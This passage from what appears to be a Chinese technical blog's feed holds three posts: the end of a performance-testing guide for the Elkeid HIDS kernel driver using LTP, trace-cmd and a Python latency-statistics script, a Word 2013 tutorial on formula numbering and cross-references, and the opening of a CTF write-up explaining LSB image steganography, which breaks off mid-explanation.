<h2 id="装载-Elkeid-Driver"><a href="#装载-Elkeid-Driver" class="headerlink" title="装载 Elkeid Driver"></a>装载 Elkeid Driver</h2><p>从 Github 仓库下载当前最新版本的 Elkeid 项目，并编译得到其 Driver 组件的内核模块文件 hids_driver.ko，使用 <code>modinfo</code> 命令查看内核模块信息，使用 <code>insmod</code> 命令装载内核模块，使用 <code>lsmod</code> 命令查看系统已装载的内核模块：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/bytedance/Elkeid.git</span><br><span class="line">$ <span class="built_in">cd</span> ./Elkeid/driver/LKM/</span><br><span class="line">$ make</span><br><span class="line">$ modinfo ./hids_driver.ko</span><br><span class="line">$ insmod ./hids_driver.ko</span><br><span class="line">$ lsmod | grep hids_driver</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/operational-guide-of-elkeid-driver-performance-test/make-elkeid-driver.png" alt="make-elkeid-driver"></p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/operational-guide-of-elkeid-driver-performance-test/modinfo-insmod-elkeid-driver.png" alt="modinfo-insmod-elkeid-driver"></p>
<h2 id="执行-LTP-测试用例"><a href="#执行-LTP-测试用例" class="headerlink" title="执行 LTP 测试用例"></a>执行 LTP 测试用例</h2><p>在 Driver 组件介绍文档中得知，针对 <code>connect</code>、<code>bind</code>、<code>execve</code>、<code>security_inode_create</code>、<code>ptrace</code> 等五个系统调用函数，执行了相关测试用例：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/operational-guide-of-elkeid-driver-performance-test/elkeid-driver-testing-load.png" alt="elkeid-driver-testing-load"></p>
<p>下面将选取 connect 系统调用函数的测试用例作为演示，并持续执行 5 分钟：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ /opt/ltp/runltp -f syscalls -s connect -t 5m</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/operational-guide-of-elkeid-driver-performance-test/runltp-syscalls-connect.png" alt="runltp-syscalls-connect"></p>
<p><code>runltp</code> 命令的相关参数含义如下：</p>
<ul>
<li><code>-f CMDFILES</code>：Execute user defined list of testcases (separate with ‘,’)</li>
<li><code>-s PATTERN</code>：Only run test cases which match PATTERN.</li>
<li><code>-t DURATION</code> ：Execute the testsuite for given duration.</li>
</ul>
<p>通过 <code>-f syscalls</code> 指定与系统调用函数相关的测试集，备选测试集位于 &#x2F;opt&#x2F;ltp&#x2F;runtest 路径下；而通过 <code>-s connect</code> 指定测试集中命名格式与 connect 字符串相匹配的测试用例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> /opt/ltp/runtest</span><br><span class="line">$ <span class="built_in">cat</span> /opt/ltp/runtest/syscalls | grep connect</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/operational-guide-of-elkeid-driver-performance-test/runltp-runtest.png" alt="runltp-runtest"></p>
<h2 id="使用-trace-cmd-跟踪分析"><a href="#使用-trace-cmd-跟踪分析" class="headerlink" title="使用 trace-cmd 跟踪分析"></a>使用 trace-cmd 跟踪分析</h2><p>在以上 LTP 测试用例的执行过程中，同时在另一个终端使用 trace-cmd 工具，通过 <code>-p function_graph</code> 启用「函数调用图追踪器」，通过 <code>-l connect_syscall_entry_handler</code> 指定 Driver 组件中的内核函数，通过 <code>-o connect_syscall_entry_handler_data</code> 指定结果保存文件，持续进行 90 秒的跟踪分析：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ trace-cmd record -p function_graph -l connect_syscall_entry_handler -o connect_syscall_entry_handler_data <span class="built_in">sleep</span> 90</span><br></pre></td></tr></table></figure>

<p><code> trace-cmd record</code> 命令的相关参数含义如下：</p>
<ul>
<li><code>-p</code>：run command with plugin enabled</li>
<li><code>-l</code>：filter function name</li>
<li><code>-o</code>：data output file [default trace.dat]</li>
</ul>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/operational-guide-of-elkeid-driver-performance-test/trace-cmd-record.png" alt="trace-cmd-record"></p>
<p>若读者不熟悉 trace-cmd 的追踪器类型，或不明确需跟踪的内核函数，则可以使用 <code>trace-cmd list</code> 命令查看：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ trace-cmd list -t</span><br><span class="line">$ trace-cmd list -f hids_driver | grep connect</span><br></pre></td></tr></table></figure>

<p><code> trace-cmd list</code> 命令的相关参数含义如下：</p>
<ul>
<li><code>-t</code>：list available tracers</li>
<li><code>-f [regex] </code>：list available functions to filter on</li>
</ul>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/operational-guide-of-elkeid-driver-performance-test/trace-cmd-list.png" alt="trace-cmd-list"></p>
<p>跟踪任务结束后，通过 <code>-i connect_syscall_entry_handler_data</code> 指定需输出展示的结果文件，发现共有 57891 条记录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ trace-cmd report -i connect_syscall_entry_handler_data | <span class="built_in">wc</span> -l</span><br><span class="line">$ trace-cmd report -i connect_syscall_entry_handler_data | <span class="built_in">head</span></span><br></pre></td></tr></table></figure>

<p><code> trace-cmd report</code> 命令的相关参数含义如下：</p>
<ul>
<li><code>-i</code>：input file [default trace.dat]</li>
</ul>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/operational-guide-of-elkeid-driver-performance-test/trace-cmd-report.png" alt="trace-cmd-report"></p>
<p>对照 Elkeid 项目中性能测试的原始数据，可见其文件格式与 trace-cmd 的测试结果保持一致，说明上述测试操作流程基本推导正确：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ./Elkeid/driver/benchmark_data/handler/</span><br><span class="line">$ <span class="built_in">head</span> connect_syscall_entry_handler_data</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/operational-guide-of-elkeid-driver-performance-test/elkeid-driver-benchmark-data.png" alt="elkeid-driver-benchmark-data"></p>
<h1 id="0x03-测试结果分析"><a href="#0x03-测试结果分析" class="headerlink" title="0x03 测试结果分析"></a>0x03 测试结果分析</h1><p>测试操作流程结束后，需对 trace-cmd 的跟踪任务结果进行分析：</p>
<p>首先，解读 Elkeid Driver 组件的性能测试结果及相关指标；再依据此，编写通用自动化分析脚本，完成对上述测试结果的分析。</p>
<h2 id="指标解读"><a href="#指标解读" class="headerlink" title="指标解读"></a>指标解读</h2><p>针对 Driver 组件中编写的内核函数，均包含 Average Delay(us)、TP99(us)、TP95(us)、TP90(us) 等四个指标，用于说明每个内核函数执行的耗时开销：</p>
<ul>
<li><code>Average Delay</code>：针对某个内核函数，其所有执行操作的平均耗时。</li>
<li><code>TP99</code>：针对某个内核函数，其中 99% 的执行操作耗时不超过 TP99，即在 99% 概率下的耗时上限。TP95 与 TP90 同理。</li>
</ul>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/operational-guide-of-elkeid-driver-performance-test/elkeid-driver-testing-result.png" alt="elkeid-driver-testing-result"></p>
<p>从上图性能测试结果分析可知：</p>
<ul>
<li>connect_syscall_entry_handler 函数执行的 Average Delay 为 0.0675 微秒，TP99 为 0.3 微秒，说明此函数有 99% 的执行操作耗时不超过 0.3 微秒。</li>
<li>其余大部分函数执行的 Average Delay 在 10 微秒内，最大不超过 20 微秒；而大部分 TP99 在 20 微秒内，最大不超过 100 微秒。</li>
</ul>
<h2 id="自动化分析"><a href="#自动化分析" class="headerlink" title="自动化分析"></a>自动化分析</h2><p>为了从 trace-cmd 测试结果中快速获取上述指标，编写了以下 Python3 自动化分析脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: python3 auto_statistics.py [filename]&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    filename = sys.argv[<span class="number">1</span>]</span><br><span class="line">    usList = getUsList(filename)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Total Counts: %d&#x27;</span> % <span class="built_in">len</span>(usList))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Average Delay: %.4fus&#x27;</span> % getAvg(usList))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;TP99: %.4fus&#x27;</span> % getTP(usList, <span class="number">0.99</span>)[<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;TP95: %.4fus&#x27;</span> % getTP(usList, <span class="number">0.95</span>)[<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;TP90: %.4fus&#x27;</span> % getTP(usList, <span class="number">0.90</span>)[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getUsList</span>(<span class="params">filename</span>):</span><br><span class="line">    usList = []</span><br><span class="line">    pattern = <span class="string">r&quot;([\d\.]+) us&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            <span class="keyword">match</span> = re.search(pattern, line)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                usList.append(<span class="built_in">float</span>(<span class="keyword">match</span>.group(<span class="number">1</span>)))</span><br><span class="line">    usList.sort()</span><br><span class="line">    <span class="keyword">return</span> usList</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getAvg</span>(<span class="params"><span class="built_in">list</span></span>):</span><br><span class="line">    avg = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> index, us <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">list</span>):</span><br><span class="line">        avg = avg * (index/(index+<span class="number">1</span>)) + us * (<span class="number">1</span>/(index+<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> avg</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getTP</span>(<span class="params"><span class="built_in">list</span>, ratio</span>):</span><br><span class="line">    index = <span class="built_in">int</span>(ratio * <span class="built_in">len</span>(<span class="built_in">list</span>)) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> index, <span class="built_in">list</span>[index]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>将此脚本保存至 auto_statistics.py 文件中，并对本文的 connect_syscall_entry_handler_data 测试结果进行分析，得到 Average Delay 为 0.0737 微秒，TP99 为 0.2920 微秒，TP95 为 0.1730 微秒，TP90 为 0.1270 微秒，可见与官方分析结果基本一致：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ trace-cmd report -i connect_syscall_entry_handler_data &gt; connect_syscall_entry_handler_data.txt</span><br><span class="line">$ python3 auto_statistics.py connect_syscall_entry_handler_data.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/operational-guide-of-elkeid-driver-performance-test/auto-statistics-connect-data.png" alt="auto-statistics-connect-data"></p>
<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>本文针对 Elkeid Driver 组件的性能测试，从测试工具、测试操作流程、测试结果分析等方面进行了详细介绍，为 Driver 组件的开发者提供了操作指引，甚至对 Linux 内核模块的开发测试也具有一定参考意义。</p>
<p>感谢各位阅读，若发现有错误之处恳请指出，也欢迎读者提出与文章结构或内容描述相关的修订意见，以助于改进。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] <a href="https://jitwxs.cn/51dc9e04">LTP 第一章 LTP 介绍及内部机制</a> </p>
<p>[2] <a href="https://linux.cn/article-13852-1.html">使用 trace-cmd 追踪内核</a></p>
<p>[3] <a href="https://blog.csdn.net/weixin_44410537/article/details/103587609">ftrace和trace-cmd：跟踪内核函数的利器</a></p>
<p>[4] <a href="https://stackoverflow.com/questions/17435438/what-do-we-mean-by-top-percentile-or-tp-based-latency">What do we mean by “top percentile” or TP based latency?</a></p>
]]></content>
      <categories>
        <category>InfoSec</category>
        <category>HIDS</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Linux</tag>
        <tag>Bash</tag>
        <tag>Kernel</tag>
        <tag>C</tag>
        <tag>HIDS</tag>
        <tag>Elkeid</tag>
        <tag>LTP</tag>
        <tag>Benchmark</tag>
      </tags>
  </entry>
  <entry>
    <title>Microsoft Word 2013 公式自动编号与交叉引用</title>
    <url>/2019/01/30/microsoft-word-2013-formula-automatic-numbering-and-cross-reference/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在科技论文写作中，必不可少要使用到数学公式，虽然编辑公式简单，但要<strong>将一系列公式自动编号，并且在文中交叉引用</strong>，成为了科研工作者亟需解决的我问题。本文将采用 <strong>Microsoft Word 2013 + MathType</strong>，向大家介绍一种一劳永逸的解决方案，在其他版本的 Microsoft Word 中也基本适用。</p>
<span id="more"></span>

<h1 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h1><h2 id="安装-MathType"><a href="#安装-MathType" class="headerlink" title="安装 MathType"></a>安装 MathType</h2><p><a href="http://www.mathtype.cn/">MathType</a> 是一款专业的数学公式编辑工具，能与 Microsoft Word 完美结合，加上显示效果不俗，因此成为了广大理科男在 Word 上编辑公式的首选。此外，MathType 是共享软件，有 30 天的试用期，有需要的用户可以购买完整版，不过基本版的功能已满足大部分用户的需求了。</p>
<p>安装完成后，新建并打开一个 Word 文档 <code>新建 Microsoft Word 文档.docx</code>，正常情况下顶部菜单栏会增加一个 <strong>MathType</strong> 选项，说明已安装成功。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/microsoft-word-2013-formula-automatic-numbering-and-cross-reference/mathtype-installation.png" alt="mathtype-installation"></p>
<h2 id="插入公式"><a href="#插入公式" class="headerlink" title="插入公式"></a>插入公式</h2><p>点击 <strong>MathType -&gt; 内联</strong>，在公式编辑框内输入一个勾股定理表达式 $a^2 + b^2 &#x3D; c^2$，按下 <strong>Ctrl + S</strong> 保存后关闭编辑框，表达式已在文档中显示。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/microsoft-word-2013-formula-automatic-numbering-and-cross-reference/formula-edit.png" alt="formula-edit"></p>
<h2 id="显示编辑标记"><a href="#显示编辑标记" class="headerlink" title="显示编辑标记"></a>显示编辑标记</h2><p>点击 <strong>开始 -&gt; 显示&#x2F;隐藏编辑标记</strong>，可显示制表符、分页符、空格等标记，有助于对后续操作的直观理解。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/microsoft-word-2013-formula-automatic-numbering-and-cross-reference/show-mark.png" alt="show-mark"></p>
<h1 id="0x02-插入题注"><a href="#0x02-插入题注" class="headerlink" title="0x02 插入题注"></a>0x02 插入题注</h1><h2 id="无章节序号"><a href="#无章节序号" class="headerlink" title="无章节序号"></a>无章节序号</h2><p>点击 <strong>引用 -&gt; 插入题注 -&gt; 新建标签</strong>，在框内输入左小括号 <code>（</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/microsoft-word-2013-formula-automatic-numbering-and-cross-reference/new-mark-normal.png" alt="new-mark-normal"></p>
<p>点击确定后，在 <strong>题注</strong> 内显示 <code>（ 1</code>，在 <strong>标签</strong> 内显示 <code>（</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/microsoft-word-2013-formula-automatic-numbering-and-cross-reference/display-mark-normal.png" alt="display-mark-normal"></p>
<p>点击确定后，发现 <code>（</code> 与 <code>1</code> 之间有个小点，此为空格标记（该空格默认自带，无法再编辑题注中删除）。将此空格删除后，并在末尾补充上右小括号 <code>）</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/microsoft-word-2013-formula-automatic-numbering-and-cross-reference/modify-mark-normal.png" alt="modify-mark-normal"></p>
<h2 id="有章节序号"><a href="#有章节序号" class="headerlink" title="有章节序号"></a>有章节序号</h2><p>点击 <strong>引用 -&gt; 插入题注 -&gt; 新建标签</strong>，若想在第一章插入题注，则在框内输入左小括号 <code>（1-</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/microsoft-word-2013-formula-automatic-numbering-and-cross-reference/new-mark-chapter.png" alt="new-mark-chapter"></p>
<p>点击确定后，在 <strong>题注</strong> 内显示 <code>（1- 1</code>，在 <strong>标签</strong> 内显示 <code>（1-</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/microsoft-word-2013-formula-automatic-numbering-and-cross-reference/display-mark-chapter.png" alt="display-mark-chapter"></p>
<p>同样地，点击确定后，将 <code>（1-</code> 与 <code>1</code> 之间的空格删除，并在末尾补充上右小括号 <code>）</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/microsoft-word-2013-formula-automatic-numbering-and-cross-reference/modify-mark-chapter.png" alt="modify-mark-chapter"></p>
<p>以上根据有无章节序号，介绍了两种插入题注的风格，读者可按需选用。</p>
<h1 id="0x03-创建段落样式"><a href="#0x03-创建段落样式" class="headerlink" title="0x03 创建段落样式"></a>0x03 创建段落样式</h1><h2 id="新建样式"><a href="#新建样式" class="headerlink" title="新建样式"></a>新建样式</h2><p>点击 <strong>开始 -&gt; 样式</strong> 中右下角的小箭头，在弹出框的左下角点击 <strong>新建样式</strong>，将新样式编辑框中的 <strong>属性 -&gt; 名称</strong> 改为 <code>公式</code>，并点击左下角的 <strong>格式 -&gt; 制表位</strong>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/microsoft-word-2013-formula-automatic-numbering-and-cross-reference/initiate-pattern.png" alt="initiate-pattern"></p>
<p>在 <strong>制表位位置</strong> 输入 <code>20 字符</code>，将 <strong>对齐方式</strong> 选为 <code>居中</code> 后点击确定：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/microsoft-word-2013-formula-automatic-numbering-and-cross-reference/tab-middle.png" alt="tab-middle"></p>
<p>再次点击左下角的 <strong>格式 -&gt; 制表位</strong>，在 <strong>制表位位置</strong> 输入 <code>40 字符</code>，将 <strong>对齐方式</strong> 选为 <code>右对齐</code> 后点击确定：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/microsoft-word-2013-formula-automatic-numbering-and-cross-reference/tab-right.png" alt="tab-right"></p>
<p>建议将样式编辑框中的 <strong>格式 -&gt; 中文</strong> 设置为 <code>宋体</code>，将 <strong>格式 -&gt; 西文</strong> 设置为 <code>Times New Roman</code>，最后点击确定，在 <strong>开始 -&gt; 样式</strong> 中出现了刚添加的样式：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/microsoft-word-2013-formula-automatic-numbering-and-cross-reference/complete-pattern.png" alt="complete-pattern"></p>
<h2 id="使用样式"><a href="#使用样式" class="headerlink" title="使用样式"></a>使用样式</h2><p>以无章节序号的公式编号为例，将光标放至公式所在行的任意位置，点击 <strong>开始 -&gt; 样式</strong> 中的 <code>公式</code> 后，分别在公式前面、公式与编号之间按下 <strong>Tab</strong> 键（向右的小箭头即为 Tab 标记），出现了公式居中、编号右对齐的效果：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/microsoft-word-2013-formula-automatic-numbering-and-cross-reference/format-with-pattern.png" alt="format-with-pattern"></p>
<p>此外，为了在交叉引用时，只引用编号而不引用公式，需要在公式与编号之间添加一个<a href="https://answers.microsoft.com/en-us/office/forum/office_2010-word/ctrlaltenter-function-in-word-2010/3d3f2583-f56a-4aaf-8e38-267c5723eedc">样式分隔符</a>。在公式下方另起一空行，按下 <strong>Ctrl + Alt + Enter</strong>，发现在原来的 Enter 标记前，多了一个被虚线框起的 Enter 标记：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/microsoft-word-2013-formula-automatic-numbering-and-cross-reference/initiate-style-separator.png" alt="initiate-style-separator"></p>
<p>被虚线框起的 Enter 标记即为样式分隔符，将其复制到公式与编号之间，最终效果如下：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/microsoft-word-2013-formula-automatic-numbering-and-cross-reference/insert-style-separator.png" alt="insert-style-separator"></p>
<h1 id="0x04-保存至自动图文集"><a href="#0x04-保存至自动图文集" class="headerlink" title="0x04 保存至自动图文集"></a>0x04 保存至自动图文集</h1><p>完成上述步骤后，已达到基本使用要求，但为了后续的方便使用，最好将公式编号的模板保存至自动图文集中。</p>
<p>点击 <strong>文件 -&gt; 选项 -&gt; 快速访问工具栏</strong>，在 <strong>选择命令</strong> 下拉框内选择 <code>所有命令</code>，将 <code>自动图文集</code> 添加至快速访问工具栏：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/microsoft-word-2013-formula-automatic-numbering-and-cross-reference/add-quick-access.png" alt="add-quick-access"></p>
<p>添加完成后点击确定，在顶部工具栏出现了自动图文集的图标。接着全选公式所在行，再点击 <strong>自动图文集 -&gt; 将所选内容保存到自动图文集库</strong>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/microsoft-word-2013-formula-automatic-numbering-and-cross-reference/save-normal-pattern.png" alt="save-normal-pattern"></p>
<p>此处将<strong>新建构建基块</strong>的名称设置为 <code>公式编号_交叉引用_普通版</code>，点击确定后即可完成：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/microsoft-word-2013-formula-automatic-numbering-and-cross-reference/name-normal-pattern.png" alt="name-normal-pattern"></p>
<p>将公式编号由无章节序号更改为有章节序号后，同样全选公式所在行，再点击 <strong>自动图文集 -&gt; 将所选内容保存到自动图文集库</strong>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/microsoft-word-2013-formula-automatic-numbering-and-cross-reference/save-chapter-pattern.png" alt="save-chapter-pattern"></p>
<p>处将<strong>新建构建基块</strong>的名称设置为 <code>公式编号_交叉引用_章节版</code>，点击确定后即可完成：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/microsoft-word-2013-formula-automatic-numbering-and-cross-reference/name-chapter-pattern.png" alt="name-chapter-pattern"></p>
<p>将以上两种公式编号的模板保存至自动图文集后，即可在 <strong>自动图文集</strong> 中选择所需模板，最后记得要替换模板内的默认公式。</p>
<h1 id="0x05-交叉引用"><a href="#0x05-交叉引用" class="headerlink" title="0x05 交叉引用"></a>0x05 交叉引用</h1><blockquote>
<p> 小贴士：<a href="https://en.wikipedia.org/wiki/Cross-reference">交叉引用</a>是指在 Microsoft Word 文档中引用其他位置的内容，例如编号项、标题、脚注、尾注、题注、书签、表格、公式等，引用的内容可随着被引用主体的改变而改变。</p>
</blockquote>
<p>继续以无章节序号的公式编号为例，演示如何在文中交叉引用公式编号：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/microsoft-word-2013-formula-automatic-numbering-and-cross-reference/inserting-cross-reference.png" alt="inserting-cross-reference"></p>
<p>若想在光标出插入公式（1）的引用，需要点击 <strong>插入 -&gt; 交叉引用</strong>，在 <strong>引用类型</strong> 下拉框内选择 <code>（</code>，在 <strong>引用内容</strong> 下拉框内选择 <code>整项题注</code>，在 <strong>引用哪一个题注</strong> 中选择 <code>（1）</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/microsoft-word-2013-formula-automatic-numbering-and-cross-reference/select-reference.png" alt="select-reference"></p>
<p>点击确定后，发现文中确实多了对公式（1）的引用：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/microsoft-word-2013-formula-automatic-numbering-and-cross-reference/inserted-cross-reference.png" alt="inserted-cross-reference"></p>
<p>接下来讨论一种常见情况，假设在公式（1）前面新插入一个圆面积计算公式 $S  &#x3D; π r^2$，这时会出现两个公式（1）：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/microsoft-word-2013-formula-automatic-numbering-and-cross-reference/insert-new-formula.png" alt="insert-new-formula"></p>
<p>此时只需要按下 <strong>Ctrl + A</strong> 选择全文，再按下 <strong>F9</strong> <a href="https://support.office.com/en-us/article/update-fields-7339a049-cb0d-4d5a-8679-97c20c643d4e">更新域</a>，原来的公式（1）则变为公式（2），完美诠释了「引用的内容可随着被引用主体的改变而改变」这一大优势：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/microsoft-word-2013-formula-automatic-numbering-and-cross-reference/update-cross-reference.png" alt="update-cross-reference"></p>
<h1 id="0x06-小结"><a href="#0x06-小结" class="headerlink" title="0x06 小结"></a>0x06 小结</h1><p>在 Microsoft Word 2013 下对公式进行自动编号与交叉引用的方法较多，本文根据笔者自身需求总结而成，以备日后写作之需，若有理解上或操作上的疑惑还请读者不吝告知，谢谢。</p>
<p>相关参考文章如下：</p>
<blockquote>
<p><a href="https://jingyan.baidu.com/article/4dc408486da1e1c8d946f133.html">WORD中公式的自动编号和交叉引用方法</a><br><a href="https://blog.csdn.net/wihiw/article/details/64443494">在 Word 2013 中编写公式并标号</a><br><a href="https://jingyan.baidu.com/article/948f592421b812d80ef5f971.html">Word论文写作如何实现公式居中、编号右对齐</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Tips</category>
        <category>Microsoft Word</category>
      </categories>
      <tags>
        <tag>Microsoft</tag>
        <tag>Word</tag>
        <tag>MathType</tag>
      </tags>
  </entry>
  <entry>
    <title>【巅峰极客 2018】 Misc —— warmup</title>
    <url>/2018/07/29/peak-geek-2018-misc-warmup/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本届「巅峰极客」网络安全技能挑战赛共有三道 Misc 题，此题是最简单的一道，分值为 100pt，难度不大，涉及<strong>图片隐写</strong>与<strong>三种特殊的编码方式</strong>，主要考察选手们对常见 Misc 题知识点的综合运用能力。 题目下载链接如下：</p>
<ul>
<li>下载链接：<a href="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2_2018_Misc_warmup/warmup.bmp">warmup.bmp</a></li>
</ul>
<span id="more"></span>

<h1 id="0x01-LSB-隐写"><a href="#0x01-LSB-隐写" class="headerlink" title="0x01 LSB 隐写"></a>0x01 LSB 隐写</h1><p><a href="https://baike.baidu.com/item/RGB"><strong>RGB</strong></a> 色彩模式是工业界的一种颜色标准，通过红（R）、绿（G）、蓝（B）三原色的相互叠加得到各种颜色。</p>
<p><strong>24 比特模式</strong>是当前最主流的表示方法，即使用三个 8 比特无符号整数分别代表红色、绿色和蓝色，每个像素点用 24 比特表示，可以产生 $2^{24} &#x3D; 16,777,216$ 种颜色组合。</p>
<p><strong>LSB 隐写</strong>是指将信息隐藏在每个颜色通道的最低有效位（Least Significant Bit）。由于改变的是每个颜色通道的最低位，对颜色改变的影响极小，因此用肉眼是无法察觉出来的。</p>
<p>显然，每个像素的三个通道可以隐藏 3 比特信息；每个 ASCII 字符有 8 比特，至少需要三个像素点，若只隐藏在某一个颜色通道，则需要八个像素点。</p>
<p>下面以<strong>连续八个像素点的红色通道隐藏字符 <code>a</code></strong> 为例进行讲解：</p>
<table>
<thead>
<tr>
<th>像素序号</th>
<th>像素隐写前</th>
<th>隐写信息</th>
<th>像素隐写后</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>(<strong>35</strong>, 21, 33)</td>
<td>0</td>
<td>(<strong>34</strong>, 21, 33)</td>
</tr>
<tr>
<td>2</td>
<td>(<strong>96</strong>, 89, 52)</td>
<td>1</td>
<td>(<strong>97</strong>, 89, 52)</td>
</tr>
<tr>
<td>3</td>
<td>(<strong>57</strong>, 211, 123)</td>
<td>1</td>
<td>(<strong>57</strong>, 211, 123)</td>
</tr>
<tr>
<td>4</td>
<td>(<strong>48</strong>, 110, 245)</td>
<td>0</td>
<td>(<strong>48</strong>, 110, 245)</td>
</tr>
<tr>
<td>5</td>
<td>(<strong>113</strong>, 201, 97)</td>
<td>0</td>
<td>(<strong>112</strong>, 201, 97)</td>
</tr>
<tr>
<td>6</td>
<td>(<strong>62</strong>, 52, 134)</td>
<td>0</td>
<td>(<strong>62</strong>, 52, 134)</td>
</tr>
<tr>
<td>7</td>
<td>(<strong>168</strong>, 65, 159)</td>
<td>0</td>
<td>(<strong>168</strong>, 65, 159)</td>
</tr>
<tr>
<td>8</td>
<td>(<strong>240</strong>, 76, 193)</td>
<td>1</td>
<td>(<strong>241</strong>, 76, 193)</td>
</tr>
</tbody></table>
<p>字符 <code>a</code> 的二进制 ASCII 码是 <code>01100001</code>，每个比特分别隐写在每个像素点红色通道的最低有效位。无论隐写前该颜色通道的值或奇或偶，若隐写信息为 <code>0</code> 比特，则隐写后值为偶数；若隐写信息为 <code>1</code> 比特，则隐写后值为奇数。</p>
